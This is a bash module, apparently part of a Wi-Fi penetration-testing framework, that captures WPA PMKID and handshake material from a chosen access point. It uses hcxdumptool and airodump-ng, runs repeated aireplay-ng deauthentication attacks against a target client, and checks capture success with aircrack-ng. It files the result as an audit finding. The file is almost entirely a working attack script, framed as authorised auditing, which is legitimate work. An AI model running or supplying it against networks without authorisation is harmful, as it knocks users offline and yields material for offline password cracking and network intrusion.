#!/usr/bin/env bash
# MODULE_META
# NAME="WPA Handshake & PMKID Capture"
# CATEGORY="D"
# DEPS="A1"
# CRITICAL="yes"
# TOOLS="aireplay-ng,aircrack-ng,hcxdumptool,hcxpcapngtool"
# DESC="Capture WPA PMKID and 4-way handshakes for offline cracking"
# REQS="monitor_iface,target_ssid,target_bssid,target_channel"
# PCAP="yes"
# DECODE="wifi_mgmt"

#===============================================================================
#  modules/d1_wpa_handshake.sh
#  D1: WPA Handshake & PMKID Capture (Golden Wrapper)
#===============================================================================

set -euo pipefail

# Inputs from Environment
INTERFACE="${MONITOR_INTERFACE:-}"
BSSID="${GUEST_BSSID:-}"
CHANNEL="${GUEST_CHANNEL:-}"
CAPTURE_TIME="${CAPTURE_TIME:-60}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="D1"
OUTPUT_BASE="${EVIDENCE_DIR}/${TC_ID}_capture"
TARGET_CLIENT="${TARGET_CLIENT:-}" 

if [[ -z "$INTERFACE" || -z "$BSSID" ]]; then
    echo "[!] MONITOR_INTERFACE or GUEST_BSSID not set."
    exit 1
fi

echo "[*] Starting WPA material capture for ${BSSID} (Channel: ${CHANNEL:-auto})..."

# 1. Start Telemetry in Background
(
    ELAPSED=0
    while true; do
        PCT=$(( 10 + (ELAPSED % 85) ))
        "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PCT" --status "Executing handshake & PMKID capture..."
        sleep 5; ELAPSED=$((ELAPSED + 5))
    done
) &
TEL_PID=$!

# 2. Run Primary Tools
RET=0
if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    # Phase 1: hcxdumptool PMKID capture
    FILTER_FILE=$(mktemp)
    echo "${BSSID}" | tr -d ':' | tr '[:upper:]' '[:lower:]' > "$FILTER_FILE"
    timeout 15 hcxdumptool -i "$INTERFACE" --filterlist_ap="$FILTER_FILE" --filtermode=2 --enable_status=1 -o "${OUTPUT_BASE}_hcxdump.pcapng" || true
    rm -f "$FILTER_FILE"

    # Phase 2: Handshake Capture
    airodump-ng --bssid "$BSSID" --channel "${CHANNEL:-0}" --write "${OUTPUT_BASE}_handshake" --output-format pcap "$INTERFACE" &
    AIRODUMP_PID=$!
    
    HANDSHAKE_FILE="${OUTPUT_BASE}_handshake-01.cap"
    ELAPSED=0
    SUCCESS=0
    while [[ $ELAPSED -lt $CAPTURE_TIME ]]; do
        if [[ -n "$TARGET_CLIENT" ]] && (( ELAPSED % 15 == 0 )); then
            aireplay-ng --deauth 5 -a "$BSSID" -c "$TARGET_CLIENT" "$INTERFACE" || true
        fi
        if [[ -f "$HANDSHAKE_FILE" ]]; then
            if aircrack-ng "$HANDSHAKE_FILE" 2>/dev/null | grep -q "1 handshake"; then
                SUCCESS=1; break
            fi
        fi
        sleep 2; ((ELAPSED+=2))
    done
    kill "$AIRODUMP_PID" 2>/dev/null || true
    RET=$?
else
    # Background Execution
    (
        FILTER_FILE=$(mktemp)
        echo "${BSSID}" | tr -d ':' | tr '[:upper:]' '[:lower:]' > "$FILTER_FILE"
        timeout 15 hcxdumptool -i "$INTERFACE" --filterlist_ap="$FILTER_FILE" --filtermode=2 --enable_status=1 -o "${OUTPUT_BASE}_hcxdump.pcapng" > /dev/null 2>&1 || true
        rm -f "$FILTER_FILE"

        airodump-ng --bssid "$BSSID" --channel "${CHANNEL:-0}" --write "${OUTPUT_BASE}_handshake" --output-format pcap "$INTERFACE" > /dev/null 2>&1 &
        AIRODUMP_PID=$!
        
        HANDSHAKE_FILE="${OUTPUT_BASE}_handshake-01.cap"
        ELAPSED=0
        SUCCESS=0
        while [[ $ELAPSED -lt $CAPTURE_TIME ]]; do
            if [[ -n "$TARGET_CLIENT" ]] && (( ELAPSED % 15 == 0 )); then
                aireplay-ng --deauth 5 -a "$BSSID" -c "$TARGET_CLIENT" "$INTERFACE" > /dev/null 2>&1 || true
            fi
            if [[ -f "$HANDSHAKE_FILE" ]]; then
                if aircrack-ng "$HANDSHAKE_FILE" 2>/dev/null | grep -q "1 handshake"; then
                    SUCCESS=1; break
                fi
            fi
            sleep 2; ((ELAPSED+=2))
        done
        kill "$AIRODUMP_PID" 2>/dev/null || true
    ) > /dev/null 2>&1 &
    TOOL_PID=$!
    wait $TOOL_PID; RET=$?
fi

# 3. Cleanup and Final Signal
kill $TEL_PID 2>/dev/null || true

# Standardize output path
FINAL_FILE="${OUTPUT_BASE}_handshake.cap"
HANDSHAKE_FILE="${OUTPUT_BASE}_handshake-01.cap"
if [[ -f "$HANDSHAKE_FILE" ]]; then
    cp "$HANDSHAKE_FILE" "$FINAL_FILE"
fi

# SUCCESS check (re-verify since we need the variable in this scope)
SUCCESS=0
if [[ -f "$FINAL_FILE" ]] && aircrack-ng "$FINAL_FILE" 2>/dev/null | grep -q "1 handshake"; then
    SUCCESS=1
fi

if [[ $SUCCESS -eq 1 ]]; then
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "WPA Handshake Captured" \
        --desc "A valid 4-way WPA handshake was successfully intercepted for BSSID ${BSSID}." \
        --severity CRITICAL \
        --evidence "$FINAL_FILE" \
        --rationale "Capturing a handshake enables offline brute-force attacks."
else
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "[$TC_ID] Audit Complete" \
        --desc "Attempted to capture WPA handshake and PMKID for BSSID ${BSSID}." \
        --severity INFO \
        --evidence "$FINAL_FILE" \
        --rationale "Handshake capture requires active client association."
fi

"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "Mission Complete"
exit $RET
